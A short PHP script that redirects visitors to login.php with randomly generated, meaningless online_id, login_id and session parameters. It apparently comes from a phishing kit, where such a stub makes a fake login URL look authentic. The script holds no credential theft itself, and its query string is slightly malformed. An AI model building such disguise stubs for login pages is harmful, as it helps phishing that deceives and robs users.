<?php
session_start();
$key = substr(sha1(mt_rand()),1,25);
$praga=rand();
$praga=md5($praga);
header("Location: login.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
?>